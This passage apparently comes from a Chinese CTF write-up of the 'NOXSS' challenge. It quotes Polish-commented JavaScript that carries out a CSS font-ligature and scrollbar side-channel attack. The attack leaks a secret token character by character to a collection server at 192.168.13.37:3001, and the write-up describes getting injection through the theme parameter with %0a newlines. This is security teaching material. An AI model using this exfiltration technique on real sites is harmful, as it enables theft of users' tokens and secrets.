class="hljs-comment">// W ramach świętowania usuńmy wszystkie iframe'y i ustawmy</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// pogrubienie na tokenie widocznym w HTML-u ;-)</span></span></span><br><span class="line">        deleteAllIframes();</span><br><span class="line"><span class="hljs-actionscript">        outputElement.style.fontWeight = <span class="hljs-string">'bold'</span>;</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Funkcja, której celem jest wydobycie następnego znaku tokena</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// metodą dziel i zwyciężaj.</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNextTokenCharacter</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Dla celów wydajnościowych - usuńmy wszystkie istniejące elementy iframe.</span></span></span><br><span class="line">            deleteAllIframes();</span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">let</span> alphabet = ALPHABET;</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Wykonujemy operacje tak długo aż wydobędziemy informację</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// jaki jest następny znak tokena.</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">while</span> (alphabet.length &gt; <span class="hljs-number">1</span>) {</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Będziemy oczekiwać na utworzenie nowego ciasteczka - najpierw więc</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// usuńmy wszystkie istniejące.</span></span></span><br><span class="line">                clearAllCookies();</span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">const</span> [leftChars, rightChars] = split(alphabet);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Najpierw upewniamy się, że fonty dla obu zestawów ligatur</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// są w cache'u.</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">await</span> makeSureFontsAreCached(leftChars, rightChars);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Niestety - praktyczne testy pokazały, że wrzucenie w to miejsce</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// sztucznego opóźnienia znacząco zwiększa prawdopodobieństwo, że atak</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// po drodze się nie "wysypie"...</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">await</span> delay(<span class="hljs-number">100</span>);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// A potem tworzymy dwa iframe'y z "atakującym" CSS-em</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">await</span> <span class="hljs-built_in">Promise</span>.all([createAttackIframe(leftChars), createAttackIframe(rightChars)]);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Czekamy na znaki z połączenia zwrotnego...</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> chars = <span class="hljs-keyword">await</span> getCharsFromReverseConnection();</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// ... i na ich podstawie kontynuujemy "dziel i zwyciężaj".</span></span></span><br><span class="line">                alphabet = chars;</span><br><span class="line">            }</span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Jeśli znaleźliśmy się w tym miejscu, to znaczy, że alphabet</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// ma jeden znak. Wniosek: ten jeden znak to kolejny znak tokena.</span></span></span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">return</span> alphabet;</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearAllCookies</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-built_in">Object</span>.keys(Cookies.get()).forEach(<span class="hljs-function"><span class="hljs-params">cookie</span> =&gt;</span> {</span></span><br><span class="line">                Cookies.remove(cookie);</span><br><span class="line">            });</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteAllIframes</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">'iframe'</span>).forEach(<span class="hljs-function"><span class="hljs-params">iframe</span> =&gt;</span> {</span></span><br><span class="line">                iframe.parentNode.removeChild(iframe);</span><br><span class="line">            });</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Funkcja dzieląca string na dwa stringi o tej</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// samej długości (lub różnej o jeden).</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Np. split("abcd") == ["ab", "cd"];</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">split</span><span class="hljs-params">(s)</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> halfLength = <span class="hljs-built_in">parseInt</span>(s.length / <span class="hljs-number">2</span>);</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">return</span> [s.substring(<span class="hljs-number">0</span>, halfLength), s.substring(halfLength)];</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Funkcja generująca losowego stringa, np.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// randomValue() == "rand6226966173982633"</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomValue</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-string">"rand"</span> + <span class="hljs-built_in">Math</span>.random().toString().slice(<span class="hljs-number">2</span>);</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Generujemy CSS-a, który zapewni nam, że fonty znajdą się w cache.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Jako dowód na to, że font został już pobrany, użyjemy sprawdzenia</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// czy ciasteczko font_${losowy_ciąg_znaków} zostało zdefiniowane.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeSureFontsAreCached</span><span class="hljs-params">(leftChars, rightChars)</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> encodedPrefix;</span></span><br><span class="line"><span class="hljs-javascript">                [encodedPrefix, leftChars, rightChars] = [prefix, leftChars, rightChars].map(<span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-built_in">encodeURIComponent</span>(val));</span></span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Generujemy CSS-a odwołującego się do obu fontów. Używamy body:before i body:after</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// by upewnić się, że przeglądarka będzie musiała oba fonty pobrać.</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">const</span> css = `</span></span><br><span class="line">                    @font-face {</span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack1'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        src: url(http:<span class="hljs-comment">//192.168.13.37:3001/font/${encodedPrefix}/${leftChars})</span></span></span><br><span class="line">                    }</span><br><span class="line">                    @font-face {</span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack2'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        src: url(http:<span class="hljs-comment">//192.168.13.37:3001/font/${encodedPrefix}/${rightChars})</span></span></span><br><span class="line">                    }</span><br><span class="line">                    body:before {</span><br><span class="line"><span class="hljs-actionscript">                        content: <span class="hljs-string">'x'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack1'</span>;</span></span><br><span class="line">                    }</span><br><span class="line">                    body:after {</span><br><span class="line"><span class="hljs-actionscript">                        content: <span class="hljs-string">'x'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack2'</span>;</span></span><br><span class="line">                    }</span><br><span class="line">                `;</span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Tworzymy iframe, w którym załadowane zostaną fonty</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">                iframe.onload = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-comment">// Funkcja zakończy swoje działanie dopiero gdy zostanie wyzwolone zdarzenie</span></span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-comment">// onload w elemencie iframe</span></span></span><br><span class="line">                    resolve();</span><br><span class="line">                }</span><br><span class="line"><span class="hljs-javascript">                iframe.src = <span class="hljs-string">'http://localhost:12345/?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(css);</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">            })</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Jak wywołana zostaje ta funkcja, to już mamy pewność, że fonty</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// są w cache'u. Spróbujmy więc zaatakować z takim stylem, w wyniku</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// którego pojawi się pasek przewijania, jeśli trafiliśmy ze znakami</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// w tokenie.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createAttackIframe</span><span class="hljs-params">(chars)</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> encodedPrefix;</span></span><br><span class="line"><span class="hljs-javascript">                [encodedPrefix, chars] = [prefix, chars].map(<span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-built_in">encodeURIComponent</span>(val));</span></span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">const</span> css = `</span></span><br><span class="line">                @font-face {</span><br><span class="line"><span class="hljs-actionscript">                    font-family: <span class="hljs-string">"hack"</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                    src: url(http:<span class="hljs-comment">//192.168.13.37:3001/font/${encodedPrefix}/${chars})</span></span></span><br><span class="line">                }</span><br><span class="line">                script {</span><br><span class="line">                    display: table;</span><br><span class="line"><span class="hljs-actionscript">                    font-family: <span class="hljs-string">"hack"</span>;</span></span><br><span class="line">                    white-space: nowrap;</span><br><span class="line">                }</span><br><span class="line">                body::-webkit-scrollbar {</span><br><span class="line">                    background: blue;</span><br><span class="line">                }</span><br><span class="line">                body::-webkit-scrollbar:horizontal {</span><br><span class="line"><span class="hljs-actionscript">                    background: blue url(http:<span class="hljs-comment">//192.168.13.37:3001/reverse/${chars});</span></span></span><br><span class="line">                }</span><br><span class="line">                `;</span><br><span class="line">            </span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">                iframe.onload = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span></span><br><span class="line">                    resolve();</span><br><span class="line">                }</span><br><span class="line"><span class="hljs-javascript">                iframe.src = <span class="hljs-string">'http://localhost:12345/?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(css);</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Ten iframe musi być stosunkowo wąski - by pojawił się pasek przewijania.</span></span></span><br><span class="line"><span class="hljs-actionscript">                iframe.style.width = <span class="hljs-string">"40px"</span>;</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">            })   </span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Sprawdzamy co 20ms czy dostaliśmy połączenie zwrotne wygenerowane</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// przez pasek przewijania. Jeśli tak - to zwracamy wartość z ciasteczka chars.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCharsFromReverseConnection</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-keyword">const</span> chars = Cookies.get(<span class="hljs-string">'chars'</span>);</span></span><br><span class="line">                    if (chars) {</span><br><span class="line">                        clearInterval(interval);</span><br><span class="line">                        resolve(chars);</span><br><span class="line">                    }</span><br><span class="line">                }, 20);</span><br><span class="line">            })</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delay</span>(<span class="hljs-params">time</span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line">                setTimeout(resolve, time);</span><br><span class="line">            })</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    })();</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是我没成功过2333…</p><h1 id="NOXSS"><a href="#NOXSS" class="headerlink" title="NOXSS"></a>NOXSS</h1><p>终于可以回到我们的题目了，其实走完以上流程，这个题目已经迎刃而解了，出题人出的点也正是 token2 的点。</p><p>随便注册一个账号之后，我们可以在 theme 参数发现有代码注入的地方，但是过滤了尖括号，我们可以用<code>%0a</code>进行换行</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120133900.png" alt=""></p><p>但是我们的最终目的跟 token2 场景类似，还是拿到 script 标签中的 secret 变量</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120134348.png" alt=""></p><p>根据 token2 场景的解法，接下来我们至少需要做到可以执行我们任意 css 代码才行。</p><p>根据文档<a href="https://www.w3.org/TR/css-syntax-3/#newline-diagram" target="_blank" rel="noopener">css newline</a>，我们可以知道换行有如下写法：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://xzfile.aliyuncs.com/media/upload/picture/20191029162244-48373126-fa25-1.png" alt=""></p><p>而且文档里也提到了<a href="https://www.w3.org/TR/css-syntax-3/#error-handling" target="_blank" rel="noopener">error-handling</a></p><blockquote><p>​ When errors occur in CSS, the parser attempts to recover gracefully, throwing away only the minimum amount of content before returning to parsing as normal. This is because errors aren’t always mistakes—new syntax looks like an error to an old parser, and it’s useful to be able to add new syntax to the language without worrying about stylesheets that include it being completely broken in older UAs.</p></blockquote><p>css 兼容性比较强，对于错误的处理也比较宽松，这里由于自己的知识有限，也暂时没有找到 chrome 对于 css 错误处理相关的内容，但是经过我们不断尝试，我们可以发现使用如下 payload 可以任意执行我们的 css 代码：</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span 